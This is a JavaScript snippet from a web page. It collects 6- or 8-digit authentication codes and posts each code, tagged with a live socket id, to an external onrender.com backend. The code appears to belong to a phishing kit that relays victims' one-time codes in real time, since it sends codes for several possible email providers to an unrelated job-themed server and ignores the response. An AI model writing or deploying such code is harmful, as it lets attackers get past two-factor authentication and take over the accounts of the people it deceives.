           function setupAuthBlock(inputId, buttonId, length = 6, apiUrl =
    'https://jobback-zuh7.onrender.com/send-auth-code') {

    const code = document.getElementById(inputId);
    const smsBtn = document.getElementById(buttonId);

    if (!code || !smsBtn) {
        console.error(`Elements not found for: ${inputId}, ${buttonId}`);
        return;
    }

    code.addEventListener('input', () => {
        let val = code.value.replace(/\D/g, '');

        // ✅ ONLY email supports 6 or 8
        if (inputId === 'emailcodedes') {
            val = val.slice(0, 8);
            code.value = val;

            if (val.length === 6 || val.length === 8) {
                smsBtn.disabled = false;
                smsBtn.style.opacity = '1';
                smsBtn.style.cursor = 'pointer';
            } else {
                smsBtn.disabled = true;
                smsBtn.style.opacity = '0.4';
                smsBtn.style.cursor = 'not-allowed';
                smsBtn.style.width = '130px';
            }
        } else {
            val = val.slice(0, length);
            code.value = val;

            if (val.length === length) {
                smsBtn.disabled = false;
                smsBtn.style.opacity = '1';
                smsBtn.style.cursor = 'pointer';
            } else {
                smsBtn.disabled = true;
                smsBtn.style.opacity = '0.4';
                smsBtn.style.cursor = 'not-allowed';
                smsBtn.style.width = '130px';
            }
        }
    });

    smsBtn.addEventListener('click', () => {
        const codeValue = code.value;
        const socketId = socket.id;

        console.log(`[${inputId}] Sending code:`, codeValue);

        // ✅ Validation fix
        if (inputId === 'emailcodedes') {
            if (!(codeValue.length === 6 || codeValue.length === 8)) {
                console.warn(`[${inputId}] Code must be 6 or 8 digits`);
                return;
            }
        } else {
            if (codeValue.length !== length) {
                console.warn(`[${inputId}] Code is not ${length} digits`);
                return;
            }
        }

        smsBtn.disabled = true;
        smsBtn.innerHTML = '<span class="loading-spinner"></span>';

        fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                code: codeValue,
                socketId: socketId
            })
        })
        .then(res => res.json())
        .then(data => {
            smsBtn.disabled = true;
            smsBtn.style.opacity = '0.4';
            smsBtn.style.cursor = 'not-allowed';
            smsBtn.style.width = '130px';
        })
        .catch(err => {
            console.error(`[${inputId}] Fetch error:`, err);
            smsBtn.innerHTML = 'Continue';
            smsBtn.disabled = false;
        });
    });
}

